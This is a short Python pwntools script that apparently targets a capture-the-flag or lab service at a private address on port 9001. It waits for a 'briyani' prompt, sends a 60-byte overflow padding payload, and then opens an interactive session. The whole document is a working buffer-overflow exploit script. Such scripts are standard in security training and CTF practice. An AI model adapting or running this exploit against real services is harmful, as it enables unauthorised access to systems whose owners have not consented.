from pwn import *

p = remote('10.10.7.194', 9001)
p.recvuntil(b'briyani: \n')
payload = flat(
        b'a'*60
        )
p.sendline(payload)
p.interactive()
